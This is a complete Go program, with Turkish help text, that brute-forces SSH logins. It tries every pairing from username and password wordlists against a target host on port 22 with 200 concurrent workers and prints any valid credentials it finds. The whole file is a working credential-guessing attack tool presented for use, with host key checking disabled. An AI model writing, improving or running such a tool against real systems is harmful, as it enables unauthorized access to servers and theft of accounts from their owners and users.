package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"sync"

	"golang.org/x/crypto/ssh"
)

var (
	password      string
	passwordFile  string
	username      string
	usernameFile  string
	targetHost    string
)

func init() {
	flag.StringVar(&targetHost, "h", "", "Hedef IP adresi veya hostname belirtin")
	flag.StringVar(&username, "u", "", "Tek bir kullanıcı adı belirtin")
	flag.StringVar(&usernameFile, "U", "", "Kullanıcı isimlerinin bulunduğu wordlist dosyasını belirtin")
	flag.StringVar(&password, "p", "", "Tek bir şifre belirtin")
	flag.StringVar(&passwordFile, "P", "", "Şifrelerin bulunduğu wordlist dosyasını belirtin")
}

func parseArgs() {
	flag.Parse()

	if (password == "" && passwordFile == "") || (username == "" && usernameFile == "") || targetHost == "" {
		fmt.Println("Hata: Gerekli parametreler eksik.")
		flag.Usage()
		os.Exit(1)
	}
}

func loadList(file string) ([]string, error) {
	data, err := ioutil.ReadFile(file)
	if err != nil {
		return nil, fmt.Errorf("dosya okunurken hata oluştu: %v", err)
	}
	return strings.Split(string(data), "\n"), nil
}

func trySSH(target string, user string, pass string) bool {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	client, err := ssh.Dial("tcp", target+":22", config)
	if err != nil {
		return false
	}
	client.Close()
	return true
}

func worker(target string, taskQueue <-chan string, wg *sync.WaitGroup) {
	defer wg.Done()
	for task := range taskQueue {
		parts := strings.Split(task, ":")
		if len(parts) != 2 {
			continue
		}
		user, pass := parts[0], parts[1]
		if trySSH(target, user, pass) {
			fmt.Printf("Başarılı: Geçerli kimlik bilgileri bulundu! Kullanıcı: %s, Şifre: %s\n", user, pass)
			return
		}
	}
}

func main() {
	parseArgs()

	var users []string
	var passwords []string

	if usernameFile != "" {
		var err error
		users, err = loadList(usernameFile)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		users = append(users, username)
	}

	if passwordFile != "" {
		var err error
		passwords, err = loadList(passwordFile)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		passwords = append(passwords, password)
	}

	var taskQueue = make(chan string, 100)
	var wg sync.WaitGroup

	for i := 0; i < 200; i++ {
		wg.Add(1)
		go worker(targetHost, taskQueue, &wg)
	}

	for _, user := range users {
		for _, pass := range passwords {
			taskQueue <- fmt.Sprintf("%s:%s", user, pass)
		}
	}

	close(taskQueue)
	wg.Wait()
}
